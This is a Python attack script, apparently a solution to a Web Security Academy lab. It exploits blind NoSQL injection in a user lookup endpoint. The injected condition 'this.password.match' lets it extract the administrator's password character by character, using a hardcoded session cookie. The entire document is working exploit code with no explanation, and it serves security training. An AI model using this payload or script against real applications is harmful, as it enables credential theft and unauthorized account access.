import urllib.parse
import requests
import urllib
import string

url = "https://0ac100fe0311daa1845d3d320091001a.web-security-academy.net/user/lookup?user="
data = ''
chara = string.ascii_lowercase + string.ascii_uppercase + string.digits 
print(chara)

while True:
    found_character = False
    for c in chara:
        payload = f"administrator' &&  this.password.match('^{data}{c}.*') ||'0'=='1"
        encoded_payload = urllib.parse.quote(payload)
        headers = {
            "Cookie" : "session=Gds6Xvo1q2nLExn15ZsmqGYWOjrCuBqH",
            }
        r = requests.get(url + encoded_payload ,headers=headers)
        print (f"[*] Bruteforce -> {c}")
        if "role" in r.text:
                data += c 
                print(f"[+] Found Character {c} -> Current Password {data}")
                found_character = True
                break
    if not found_character: 
        print("no more character")
        break

print(f"[+] Final Password {data}")
